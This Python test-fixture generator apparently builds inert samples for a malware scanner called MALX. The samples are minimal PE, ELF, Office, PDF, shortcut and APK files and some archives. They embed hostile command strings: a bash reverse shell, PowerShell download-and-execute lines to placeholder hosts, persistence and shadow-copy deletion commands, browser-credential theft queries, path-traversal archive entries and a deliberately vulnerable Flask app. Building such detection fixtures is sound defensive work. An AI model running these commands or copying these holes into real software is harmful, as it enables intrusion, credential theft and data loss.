"""Synthetic, harmless test samples built at test time.

Nothing here is real malware: the binaries are tiny hand-assembled images whose
code only returns, and "suspicious" content is inert text chosen to exercise the
detection rules. Samples are generated on demand (never committed) so security
products do not quarantine the repository.

    python scripts/generate_samples.py   # writes them to tests/samples/generated/
"""

from __future__ import annotations

import base64
import io
import os
import struct
import tarfile
import zipfile
import zlib

# ===================================================================================== PE
IMAGE_BASE = 0x140000000
SECT_ALIGN = 0x1000
FILE_ALIGN = 0x200


def _align(v: int, a: int) -> int:
    return (v + a - 1) & ~(a - 1)


def build_pe(
    imports: dict[str, list[str]] | None = None,
    strings: list[str] | None = None,
    wide_strings: list[str] | None = None,
    extra_sections: list[dict] | None = None,
    text_flags: int = 0x60000020,
    tls_callbacks: int = 0,
    overlay: bytes = b"",
    exports: list[str] | None = None,
    dll: bool = False,
    timestamp: int = 0x5F000000,
    subsystem: int = 3,
) -> bytes:
    """Build a minimal, valid PE32+ (x86-64) image.

    The entry point calls the first import (if any) and a helper function so the
    built-in disassembler has a small call graph to recover. Code only returns.
    """
    imports = imports if imports is not None else {"kernel32.dll": ["GetProcAddress", "LoadLibraryA", "ExitProcess"]}
    strings = strings or []
    wide_strings = wide_strings or []
    extra_sections = extra_sections or []
    text_rva, rdata_rva = 0x1000, 0x2000

    # ---- .rdata: strings, import tables -------------------------------------------
    rdata = bytearray()

    def put(b: bytes, align: int = 2) -> int:
        while len(rdata) % align:
            rdata.append(0)
        off = len(rdata)
        rdata.extend(b)
        return rdata_rva + off

    string_rvas = [put(s.encode("latin-1") + b"\x00") for s in strings]
    for ws in wide_strings:
        put(ws.encode("utf-16-le") + b"\x00\x00")
    dll_list = list(imports.items())
    desc_rva = put(b"\x00" * (20 * (len(dll_list) + 1)), 8)
    iat_slots: list[int] = []
    descs = []
    for dll_name, funcs in dll_list:
        hint_rvas = [put(struct.pack("<H", 0) + f.encode() + b"\x00") for f in funcs]
        name_rva = put(dll_name.encode() + b"\x00")
        ilt_rva = put(b"".join(struct.pack("<Q", h) for h in hint_rvas) + b"\x00" * 8, 8)
        iat_rva = put(b"".join(struct.pack("<Q", h) for h in hint_rvas) + b"\x00" * 8, 8)
        iat_slots += [iat_rva + 8 * i for i in range(len(funcs))]
        descs.append((ilt_rva, name_rva, iat_rva))
    for i, (ilt, name, iat) in enumerate(descs):
        struct.pack_into("<IIIII", rdata, desc_rva - rdata_rva + 20 * i, ilt, 0, 0, name, iat)
    imp_size = 20 * (len(dll_list) + 1)

    export_dir = (0, 0)
    if exports:
        name_rvas = [put(n.encode() + b"\x00") for n in exports]
        dllname_rva = put(b"sample.dll\x00")
        funcs_rva = put(b"".join(struct.pack("<I", text_rva + 0x40) for _ in exports), 4)
        names_rva = put(b"".join(struct.pack("<I", r) for r in name_rvas), 4)
        ords_rva = put(b"".join(struct.pack("<H", i) for i in range(len(exports))), 2)
        edir = struct.pack("<IIHHIIIIIII", 0, 0, 0, 0, dllname_rva, 1, len(exports), len(exports), funcs_rva, names_rva, ords_rva)
        export_dir = (put(edir, 4), len(edir))

    tls_dir = (0, 0)
    if tls_callbacks:
        cb_rva = put(b"".join(struct.pack("<Q", IMAGE_BASE + text_rva + 0x40) for _ in range(tls_callbacks)) + b"\x00" * 8, 8)
        index_rva = put(b"\x00" * 8, 8)
        tdir = struct.pack("<QQQQII", 0, 0, IMAGE_BASE + index_rva, IMAGE_BASE + cb_rva, 0, 0)
        tls_dir = (put(tdir, 8), len(tdir))

    # ---- .text --------------------------------------------------------------------
    code = bytearray()
    code += b"\x48\x83\xec\x28"                      # sub rsp, 0x28
    if string_rvas:
        ip = text_rva + len(code) + 7
        code += b"\x48\x8d\x0d" + struct.pack("<i", string_rvas[0] - ip)   # lea rcx, [rip+str]
    for slot in iat_slots[:6]:
        ip = text_rva + len(code) + 6
        code += b"\xff\x15" + struct.pack("<i", slot - ip)                 # call [rip+IAT]
    helper = text_rva + 0x40
    ip = text_rva + len(code) + 5
    code += b"\xe8" + struct.pack("<i", helper - ip)                       # call helper
    code += b"\x31\xc0\x48\x83\xc4\x28\xc3"                                # xor eax,eax; add rsp,0x28; ret
    assert len(code) <= 0x40, "entry stub too long"
    code += b"\xcc" * (0x40 - len(code))
    code += b"\x48\x31\xc0\xc3"                                            # helper: xor rax,rax; ret
    text = bytes(code)

    # ---- section table -------------------------------------------------------------
    sections = [
        {"name": b".text", "data": text, "rva": text_rva, "vsize": len(text), "flags": text_flags},
        {"name": b".rdata", "data": bytes(rdata), "rva": rdata_rva, "vsize": len(rdata), "flags": 0x40000040},
    ]
    next_rva = _align(rdata_rva + len(rdata), SECT_ALIGN)
    for ex in extra_sections:
        data = ex.get("data", b"")
        vsize = ex.get("vsize", len(data) or 0x1000)
        sections.append({"name": ex["name"].encode()[:8], "data": data, "rva": next_rva, "vsize": vsize, "flags": ex.get("flags", 0xE0000020)})
        next_rva = _align(next_rva + max(vsize, 1), SECT_ALIGN)
    n = len(sections)
    headers_size = _align(0x80 + 4 + 20 + 240 + 40 * n, FILE_ALIGN)
    raw_ptr = headers_size
    for s in sections:
        s["raw_size"] = _align(len(s["data"]), FILE_ALIGN) if s["data"] else 0
        s["raw_ptr"] = raw_ptr if s["raw_size"] else 0
        raw_ptr += s["raw_size"]
    size_of_image = _align(max(s["rva"] + max(s["vsize"], 1) for s in sections), SECT_ALIGN)

    out = bytearray(headers_size)
    out[0:2] = b"MZ"
    struct.pack_into("<I", out, 0x3C, 0x80)
    out[0x40:0x40 + 39] = b"This program cannot be run in DOS mode."
    struct.pack_into("<4s", out, 0x80, b"PE\x00\x00")
    chars = 0x0022 | (0x2000 if dll else 0)
    struct.pack_into("<HHIIIHH", out, 0x84, 0x8664, n, timestamp, 0, 0, 240, chars)
    oh = 0x98
    struct.pack_into("<HBBIIIIIQIIHHHHHHIIIIHHQQQQII", out, oh,
                     0x20B, 14, 0, len(text), len(rdata), 0, text_rva, text_rva, IMAGE_BASE, SECT_ALIGN, FILE_ALIGN,
                     6, 0, 0, 0, 6, 0, 0, size_of_image, headers_size, 0, subsystem, 0x8160,
                     0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    dd = oh + 112
    struct.pack_into("<II", out, dd + 0 * 8, *export_dir)
    struct.pack_into("<II", out, dd + 1 * 8, desc_rva, imp_size)
    struct.pack_into("<II", out, dd + 9 * 8, *tls_dir)
    if iat_slots:
        struct.pack_into("<II", out, dd + 12 * 8, descs[0][2], 8 * (len(iat_slots) + len(dll_list)))
    sh = oh + 240
    for i, s in enumerate(sections):
        struct.pack_into("<8sIIIIIIHHI", out, sh + 40 * i, s["name"].ljust(8, b"\x00"), s["vsize"], s["rva"], s["raw_size"],
                         s["raw_ptr"], 0, 0, 0, 0, s["flags"])
    body = bytearray()
    for s in sections:
        if s["raw_size"]:
            body += s["data"] + b"\x00" * (s["raw_size"] - len(s["data"]))
    return bytes(out + body) + overlay


def benign_pe() -> bytes:
    return build_pe(imports={"kernel32.dll": ["GetModuleHandleW", "ExitProcess"], "user32.dll": ["MessageBoxW"]},
                    strings=["Hello from a harmless MALX test program"])


def packed_like_pe() -> bytes:
    rnd = bytes((i * 1103515245 + 12345) >> 16 & 0xFF for i in range(16384))
    rnd = zlib.compress(os.urandom(0) + rnd * 4, 9)[:16384] + os.urandom(16384)
    return build_pe(
        imports={"kernel32.dll": ["LoadLibraryA", "GetProcAddress", "VirtualProtect"]},
        strings=["UPX!", "$Info: This file is packed with the UPX executable packer $"],
        extra_sections=[{"name": "UPX0", "data": b"", "vsize": 0x40000, "flags": 0xE0000080},
                        {"name": "UPX1", "data": rnd, "flags": 0xE0000040}],
        text_flags=0xE0000020,
    )


def suspicious_strings_pe() -> bytes:
    return build_pe(
        imports={"kernel32.dll": ["CreateFileW", "ReadFile", "GetTickCount"], "crypt32.dll": ["CryptUnprotectData"],
                 "winhttp.dll": ["WinHttpOpen", "WinHttpConnect", "WinHttpSendRequest"]},
        strings=["\\Google\\Chrome\\User Data\\Default\\Login Data", "\\Mozilla\\Firefox\\Profiles", "logins.json", "key4.db",
                 "SELECT origin_url, username_value, password_value FROM logins",
                 "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz",
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "VBoxService.exe", "vmtoolsd.exe", "SbieDll.dll",
                 "wireshark.exe", "x64dbg.exe"],
    )


def injector_pe() -> bytes:
    return build_pe(imports={"kernel32.dll": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
                                              "VirtualProtect", "IsDebuggerPresent", "CheckRemoteDebuggerPresent"],
                             "wininet.dll": ["InternetOpenA", "InternetOpenUrlA", "InternetReadFile"]},
                    strings=["http://203.0.113.50:8080/stage2.bin", "Global\\MalxTestMutex1234"])


def fake_persistence_script() -> bytes:
    return (b"@echo off\r\nrem MALX synthetic persistence test - inert text, never executed\r\n"
            b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"%APPDATA%\\upd.exe\" /f\r\n"
            b"schtasks /create /tn \"Updater\" /tr \"%APPDATA%\\upd.exe\" /sc onlogon /f\r\n"
            b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')\"\r\n")


def encoded_powershell() -> bytes:
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://test-c2.duckdns.org:4444/p')"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {enc}\n".encode()


def ransom_like_text() -> bytes:
    return (b"ALL YOUR FILES HAVE BEEN ENCRYPTED\n(MALX synthetic test note - inert)\n"
            b"To decrypt your files send 0.1 bitcoin to 1BoatSLRHtKNngkdXEeobR76b53LETtpyT\n"
            b"vssadmin delete shadows /all /quiet\nbcdedit /set {default} recoveryenabled no\n")


# ==================================================================================== ELF
def build_elf(needed: list[str] | None = None, imports: list[str] | None = None, strings: list[str] | None = None,
              rwx: bool = False, exec_stack: bool = False, interp: str | None = "/lib64/ld-linux-x86-64.so.2",
              runpath: str | None = None) -> bytes:
    """Minimal ELF64 x86-64 shared object with .dynamic/.dynsym/.dynstr, .text, .rodata."""
    needed = needed if needed is not None else ["libc.so.6"]
    imports = imports if imports is not None else ["puts"]
    strings = strings or []
    base = 0x400000
    dynstr = bytearray(b"\x00")

    def dstr(s: str) -> int:
        off = len(dynstr)
        dynstr.extend(s.encode() + b"\x00")
        return off

    needed_off = [dstr(n) for n in needed]
    runpath_off = dstr(runpath) if runpath else None
    sym_off = [dstr(s) for s in imports]
    dynsym = bytearray(24)
    for o in sym_off:
        dynsym += struct.pack("<IBBHQQ", o, 0x12, 0, 0, 0, 0)  # STB_GLOBAL|STT_FUNC, undefined
    text = b"\xf3\x0f\x1e\xfa\x55\x48\x89\xe5\xe8\x05\x00\x00\x00\x31\xc0\x5d\xc3\x90\x48\x31\xc0\xc3"
    rodata = b"".join(s.encode() + b"\x00" for s in strings) or b"\x00"
    interp_b = (interp.encode() + b"\x00") if interp else b""
    shstr = bytearray(b"\x00")

    def sname(s: str) -> int:
        off = len(shstr)
        shstr.extend(s.encode() + b"\x00")
        return off

    layout = []
    cursor = 64 + 56 * 5

    def place(name, data, align=8):
        nonlocal cursor
        cursor = _align(cursor, align)
        layout.append((name, cursor, data))
        cursor += len(data)
        return cursor - len(data)

    off_interp = place(".interp", interp_b, 1) if interp else None
    off_dynsym = place(".dynsym", bytes(dynsym))
    off_dynstr = place(".dynstr", bytes(dynstr), 1)
    dyn_entries = [(1, o) for o in needed_off]
    if runpath_off is not None:
        dyn_entries.append((29, runpath_off))
    dyn_entries += [(5, base + off_dynstr), (6, base + off_dynsym), (10, len(dynstr)), (11, 24), (0, 0)]
    dynamic = b"".join(struct.pack("<qQ", t, v) for t, v in dyn_entries)
    off_dynamic = place(".dynamic", dynamic)
    off_text = place(".text", text, 16)
    off_rodata = place(".rodata", rodata, 8)
    names = {n: sname(n) for n in [".interp", ".dynsym", ".dynstr", ".dynamic", ".text", ".rodata", ".shstrtab"] if n != ".interp" or interp}
    off_shstr = place(".shstrtab", bytes(shstr), 1)
    sh_off = _align(cursor, 8)
    total = sh_off
    sections = [b"\x00" * 64]
    idx = {}

    def sh(name, stype, flags, off, size, link=0, info=0, align=1, entsize=0):
        idx[name] = len(sections)
        sections.append(struct.pack("<IIQQQQIIQQ", names[name], stype, flags, base + off if flags & 2 else 0, off, size, link, info, align, entsize))

    if interp:
        sh(".interp", 1, 2, off_interp, len(interp_b))
    sh(".dynstr", 3, 2, off_dynstr, len(dynstr))
    sh(".dynsym", 11, 2, off_dynsym, len(dynsym), link=0, info=1, align=8, entsize=24)
    sh(".dynamic", 6, 3, off_dynamic, len(dynamic), link=0, align=8, entsize=16)
    sh(".text", 1, 6, off_text, len(text), align=16)
    sh(".rodata", 1, 2, off_rodata, len(rodata), align=8)
    sh(".shstrtab", 3, 0, off_shstr, len(shstr))
    # fix links: .dynsym -> .dynstr, .dynamic -> .dynstr
    fixed = []
    for i, raw in enumerate(sections):
        if i == idx.get(".dynsym") or i == idx.get(".dynamic"):
            vals = list(struct.unpack("<IIQQQQIIQQ", raw))
            vals[6] = idx[".dynstr"]
            raw = struct.pack("<IIQQQQIIQQ", *vals)
        fixed.append(raw)
    body = bytearray(total)
    for _name, off, data in layout:
        body[off:off + len(data)] = data
    shdrs = b"".join(fixed)
    filesz = sh_off + len(shdrs)
    ehdr = struct.pack("<4sBBBBB7sHHIQQQIHHHHHH", b"\x7fELF", 2, 1, 1, 0, 0, b"\x00" * 7, 3, 0x3E, 1, base + off_text, 64, sh_off,
                       0, 64, 56, 5, 64, len(fixed), idx[".shstrtab"])
    ph = b""
    load_flags = 7 if rwx else 5
    ph += struct.pack("<IIQQQQQQ", 6, 4, 64, base + 64, base + 64, 56 * 5, 56 * 5, 8)                    # PT_PHDR
    if interp:
        ph += struct.pack("<IIQQQQQQ", 3, 4, off_interp, base + off_interp, base + off_interp, len(interp_b), len(interp_b), 1)
    else:
        ph += struct.pack("<IIQQQQQQ", 4, 4, 0, 0, 0, 0, 0, 4)                                          # PT_NOTE (filler)
    ph += struct.pack("<IIQQQQQQ", 1, load_flags, 0, base, base, filesz, filesz, 0x1000)              # PT_LOAD
    ph += struct.pack("<IIQQQQQQ", 2, 6, off_dynamic, base + off_dynamic, base + off_dynamic, len(dynamic), len(dynamic), 8)
    ph += struct.pack("<IIQQQQQQ", 0x6474E551, 7 if exec_stack else 6, 0, 0, 0, 0, 0, 16)            # PT_GNU_STACK
    out = bytearray(ehdr + ph)
    out += body[len(out):]
    out += shdrs
    return bytes(out)


def linux_backdoor_elf() -> bytes:
    return build_elf(imports=["socket", "connect", "execve", "fork", "setsid", "ptrace", "prctl"],
                     strings=["bash -i >& /dev/tcp/192.0.2.10/4444 0>&1", "/etc/ld.so.preload", "* * * * * root /tmp/.x",
                              "/etc/crontab", "[kworker/0:1]"], rwx=True, exec_stack=True, runpath="/tmp/lib")


# ================================================================================ archives
def zip_bytes(members: dict[str, bytes], compression=zipfile.ZIP_DEFLATED) -> bytes:
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", compression) as z:
        for name, data in members.items():
            z.writestr(name, data)
    return bio.getvalue()


def archive_nested_sample() -> bytes:
    inner = zip_bytes({"loader.dll": build_pe(dll=True, exports=["DllRegisterServer"])})
    return zip_bytes({"document.pdf": minimal_pdf(), "invoice.exe": benign_pe(), "image.png": tiny_png(), "payload.zip": inner})


def path_traversal_zip() -> bytes:
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w") as z:
        z.writestr("../../../../etc/passwd", "root:x:0:0:not-real:/root:/bin/sh\n")
        z.writestr("/abs/evil.txt", "absolute")
        z.writestr("C:\\Windows\\evil.txt", "drive")
        info = zipfile.ZipInfo("link_to_etc")
        info.external_attr = (0o120777 << 16)
        z.writestr(info, "/etc/shadow")
        z.writestr("ok.txt", "fine")
    return bio.getvalue()


def path_traversal_tar() -> bytes:
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w") as t:
        for name, data in (("../../escape.txt", b"x"), ("normal/readme.txt", b"hello")):
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))
        sym = tarfile.TarInfo("evil_link")
        sym.type = tarfile.SYMTYPE
        sym.linkname = "/etc/passwd"
        t.addfile(sym)
        dev = tarfile.TarInfo("dev_null")
        dev.type = tarfile.CHRTYPE
        dev.devmajor, dev.devminor = 1, 3
        t.addfile(dev)
    return bio.getvalue()


def zip_bomb_sample(size_mb: int = 24) -> bytes:
    """Highly compressible member (ratio ~1000:1). Harmless zeros."""
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as z:
        with z.open("zeros.bin", "w") as fh:
            chunk = b"\x00" * (1024 * 1024)
            for _ in range(size_mb):
                fh.write(chunk)
    return bio.getvalue()


def many_files_zip(n: int = 120) -> bytes:
    return zip_bytes({f"f{i:05d}.txt": b"x" for i in range(n)})


def deep_nested_zip(depth: int = 12) -> bytes:
    data = b"innermost harmless text"
    for i in range(depth):
        data = zip_bytes({f"level{depth - i}.zip" if i else "inner.txt": data})
    return data


def huge_filename_zip() -> bytes:
    return zip_bytes({("A" * 3000) + ".txt": b"x", "dir/" * 80 + "deep.txt": b"y"})


def corrupted_zip() -> bytes:
    good = zip_bytes({"a.txt": b"hello" * 100, "b.txt": b"world" * 100})
    return good[: len(good) // 2]


def tar_gz_sample() -> bytes:
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w:gz") as t:
        data = fake_persistence_script()
        ti = tarfile.TarInfo("scripts/setup.bat")
        ti.size = len(data)
        t.addfile(ti, io.BytesIO(data))
    return bio.getvalue()


# =============================================================================== documents
def minimal_pdf(js: bool = False) -> bytes:
    objs = [b"<< /Type /Catalog /Pages 2 0 R" + (b" /OpenAction 4 0 R" if js else b"") + b" >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>"]
    if js:
        objs.append(b"<< /Type /Action /S /JavaScript /JS (app.alert\\('MALX synthetic test'\\); this.submitForm\\('http://198.51.100.20/x'\\);) >>")
    out = bytearray(b"%PDF-1.7\n")
    for i, o in enumerate(objs, 1):
        out += f"{i} 0 obj\n".encode() + o + b"\nendobj\n"
    stream = zlib.compress(b"BT /F1 12 Tf 10 10 Td (Visit http://198.51.100.21/landing) Tj ET")
    out += f"{len(objs) + 1} 0 obj\n<< /Length {len(stream)} /Filter /FlateDecode >>\nstream\n".encode() + stream + b"\nendstream\nendobj\n"
    out += b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
    return bytes(out)


def malformed_pdf() -> bytes:
    return b"%PDF-1.4\n1 0 obj << /J#61vaScript (x) /OpenAction 99 0 R >>\nstream\n\x78\x9c\x00garbage\nendstream\n" + os.urandom(64)


def ooxml_template_injection() -> bytes:
    ct = b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>'
    rels = (b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            b'Target="http://198.51.100.30/template.dotm" TargetMode="External"/></Relationships>')
    doc = (b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>'
           b'<w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r></w:p></w:body></w:document>')
    core = (b'<?xml version="1.0"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
            b'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/"><dc:creator>MALX test</dc:creator>'
            b'<dcterms:created>2024-01-02T03:04:05Z</dcterms:created></cp:coreProperties>')
    return zip_bytes({"[Content_Types].xml": ct, "word/document.xml": doc, "word/_rels/settings.xml.rels": rels, "docProps/core.xml": core})


def rtf_exploit_like() -> bytes:
    hexobj = (b"01050000" + b"02000000" + b"0b000000" + "Equation.3".encode().hex().encode() + b"00" + b"0" * 64)
    return b"{\\rtf1\\ansi{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata " + hexobj + b"}}}"


def lnk_powershell() -> bytes:
    flags = 0x8 | 0x20 | 0x80  # HasRelativePath | HasArguments | IsUnicode
    header = struct.pack("<I16sIIQQQIiI", 0x4C, bytes.fromhex("0114020000000000c000000000000046"), flags, 0x20, 0, 0, 0, 0, 0, 7)
    header += b"\x00" * (76 - len(header))

    def sd(s: str) -> bytes:
        return struct.pack("<H", len(s)) + s.encode("utf-16-le")

    rel = "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    args = " " * 60 + "-w hidden -nop -c \"iex (iwr http://198.51.100.40/p.ps1)\""
    return header + sd(rel) + sd(args) + b"\x00\x00\x00\x00"


def tiny_png() -> bytes:
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)

    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00")) + chunk(b"IEND", b"")


# ================================================================================ android
def build_axml(elements: list[tuple[str, dict[str, object], int]]) -> bytes:
    """Tiny binary-XML writer: elements are (tag, attrs, depth_delta_after) with explicit nesting."""
    strings: list[str] = []

    def sid(s: str) -> int:
        if s not in strings:
            strings.append(s)
        return strings.index(s)

    ns = "http://schemas.android.com/apk/res/android"
    sid("android")
    sid(ns)
    body = bytearray()
    ns_chunk = struct.pack("<HHIIIII", 0x0100, 16, 24, 1, 0xFFFFFFFF, sid("android"), sid(ns))
    body += ns_chunk
    stack = []
    for tag, attrs, closes in elements:
        attr_bytes = bytearray()
        for k, v in attrs.items():
            if isinstance(v, bool):
                attr_bytes += struct.pack("<IIIHBBI", sid(ns), sid(k), 0xFFFFFFFF, 8, 0, 0x12, 0xFFFFFFFF if v else 0)
            elif isinstance(v, int):
                attr_bytes += struct.pack("<IIIHBBI", sid(ns), sid(k), 0xFFFFFFFF, 8, 0, 0x10, v)
            else:
                attr_bytes += struct.pack("<IIIHBBI", 0xFFFFFFFF if k == "package" else sid(ns), sid(k), sid(str(v)), 8, 0, 0x03, sid(str(v)))
        el = struct.pack("<HHIIIIIHHHHHH", 0x0102, 16, 36 + len(attr_bytes), 1, 0xFFFFFFFF, 0xFFFFFFFF, sid(tag), 20, 20,
                         len(attrs), 0, 0, 0) + attr_bytes
        body += el
        stack.append(tag)
        for _ in range(closes):
            t = stack.pop()
            body += struct.pack("<HHIIIII", 0x0103, 16, 24, 1, 0xFFFFFFFF, 0xFFFFFFFF, sid(t))
    while stack:
        t = stack.pop()
        body += struct.pack("<HHIIIII", 0x0103, 16, 24, 1, 0xFFFFFFFF, 0xFFFFFFFF, sid(t))
    # string pool (UTF-16)
    data = bytearray()
    offsets = []
    for s in strings:
        offsets.append(len(data))
        data += struct.pack("<H", len(s)) + s.encode("utf-16-le") + b"\x00\x00"
    while len(data) % 4:
        data += b"\x00"
    hdr = 28
    pool = struct.pack("<HHIIIIII", 0x0001, hdr, hdr + 4 * len(strings) + len(data), len(strings), 0, 0, hdr + 4 * len(strings), 0)
    pool += b"".join(struct.pack("<I", o) for o in offsets) + data
    total = 8 + len(pool) + len(body)
    return struct.pack("<HHI", 0x0003, 8, total) + pool + body


def build_dex(strings: list[str]) -> bytes:
    strings = sorted(set(strings))
    header_size = 0x70
    ids_off = header_size
    data_off = ids_off + 4 * len(strings)
    data = bytearray()
    ids = bytearray()
    for s in strings:
        ids += struct.pack("<I", data_off + len(data))
        enc = s.encode()
        data += bytes([len(s) & 0x7F]) + enc + b"\x00"
    hdr = bytearray(header_size)
    hdr[0:8] = b"dex\n035\x00"
    struct.pack_into("<I", hdr, 0x20, header_size + len(ids) + len(data))
    struct.pack_into("<I", hdr, 0x24, header_size)
    struct.pack_into("<I", hdr, 0x28, 0x12345678)
    struct.pack_into("<II", hdr, 0x38, len(strings), ids_off)
    return bytes(hdr + ids + data)


def banker_like_apk() -> bytes:
    manifest = build_axml([
        ("manifest", {"package": "org.malx.synthetic.test", "versionName": "1.0"}, 0),
        ("uses-sdk", {"minSdkVersion": 21, "targetSdkVersion": 28}, 1),
        ("uses-permission", {"name": "android.permission.RECEIVE_SMS"}, 1),
        ("uses-permission", {"name": "android.permission.READ_SMS"}, 1),
        ("uses-permission", {"name": "android.permission.SEND_SMS"}, 1),
        ("uses-permission", {"name": "android.permission.INTERNET"}, 1),
        ("uses-permission", {"name": "android.permission.SYSTEM_ALERT_WINDOW"}, 1),
        ("uses-permission", {"name": "android.permission.RECEIVE_BOOT_COMPLETED"}, 1),
        ("application", {"name": ".App", "debuggable": True}, 0),
        ("service", {"name": ".AccessService", "permission": "android.permission.BIND_ACCESSIBILITY_SERVICE", "exported": True}, 0),
        ("intent-filter", {}, 0),
        ("action", {"name": "android.accessibilityservice.AccessibilityService"}, 3),
        ("receiver", {"name": ".BootReceiver"}, 0),
        ("intent-filter", {}, 0),
        ("action", {"name": "android.intent.action.BOOT_COMPLETED"}, 3),
    ])
    dex = build_dex(["Landroid/telephony/SmsManager;", "Ldalvik/system/DexClassLoader;", "sendTextMessage",
                     "http://198.51.100.60/gate.php", "Lorg/malx/synthetic/test/App;", "assets/payload.dex"])
    return zip_bytes({"AndroidManifest.xml": manifest, "classes.dex": dex, "resources.arsc": b"\x02\x00\x0c\x00",
                      "META-INF/MANIFEST.MF": b"Manifest-Version: 1.0\n"})


# ================================================================================= appsec
def vulnerable_project_zip(secret: str) -> bytes:
    app_py = f'''from flask import Flask, request, send_file
import sqlite3, subprocess, pickle, yaml, requests
app = Flask(__name__)
app.config["SECRET_KEY"] = "{secret}"
AWS_KEY = "AKIAABCDEFGHIJKLMNOP"

@app.route("/api/users")
def users():
    name = request.args.get("name")
    db = sqlite3.connect("x.db")
    return str(db.execute(f"SELECT * FROM users WHERE name = '{{name}}'").fetchall())

@app.route("/admin/run", methods=["POST"])
def run():
    subprocess.run(request.form["cmd"], shell=True)
    return "ok"

@app.route("/download")
def download():
    return send_file(request.args["path"])

@app.route("/fetch")
def fetch():
    return requests.get(request.args["url"], verify=False).text

@app.route("/upload", methods=["POST"])
def upload():
    f = request.files["file"]
    f.save("/srv/uploads/" + f.filename)
    return pickle.loads(f.read())

if __name__ == "__main__":
    app.run(debug=True)
'''
    req = "flask==2.0.0\nrequests==2.19.0\npyyaml>=5.1\nsqlalchemy\n"
    pkg = '{"name": "frontend", "dependencies": {"lodash": "4.17.15", "express": "^4.17.1"}}'
    js = "const express = require('express');\nconst app = express();\napp.get('/api/item', (req, res) => { res.send(req.query.q); });\n" \
         "app.post('/login', (req, res) => { el.innerHTML = req.body.name; });\n"
    return zip_bytes({"project/app.py": app_py.encode(), "project/requirements.txt": req.encode(), "project/web/package.json": pkg.encode(),
                      "project/web/server.js": js.encode(), "project/README.md": b"# demo\n"})


def test_advisory() -> dict:
    """A synthetic OSV advisory used only by the test-suite (not a real CVE)."""
    return {"id": "MALX-TEST-0001", "summary": "Synthetic test advisory for MALX dependency matching", "aliases": [],
            "affected": [{"package": {"ecosystem": "PyPI", "name": "flask"},
                          "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.5"}]}]}],
            "database_specific": {"severity": "HIGH"}}


def eicar_like() -> bytes:
    """The EICAR test string assembled at runtime (kept split so the repo is not flagged)."""
    parts = ["X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-ANTIVIRUS-", "TEST-FILE!$H+H*"]
    return "".join(parts).encode()


ALL_SAMPLES = {
    "benign_pe.exe": benign_pe,
    "packed_like_sample.exe": packed_like_pe,
    "suspicious_strings_sample.exe": suspicious_strings_pe,
    "injector_sample.exe": injector_pe,
    "fake_persistence_sample.bat": fake_persistence_script,
    "encoded_powershell.ps1": encoded_powershell,
    "ransom_like_note.txt": ransom_like_text,
    "linux_backdoor_like.elf": linux_backdoor_elf,
    "archive_nested_sample.zip": archive_nested_sample,
    "path_traversal_test_archive.zip": path_traversal_zip,
    "path_traversal_test_archive.tar": path_traversal_tar,
    "zip_bomb_test_metadata.zip": zip_bomb_sample,
    "deep_nested.zip": deep_nested_zip,
    "pdf_with_javascript.pdf": lambda: minimal_pdf(js=True),
    "template_injection.docx": ooxml_template_injection,
    "equation_object.rtf": rtf_exploit_like,
    "powershell_shortcut.lnk": lnk_powershell,
    "banker_like.apk": banker_like_apk,
    "vulnerable_project.zip": lambda: vulnerable_project_zip("super-secret-flask-key-123"),
    "invoice.pdf": benign_pe,  # extension mismatch: PE disguised as PDF
}
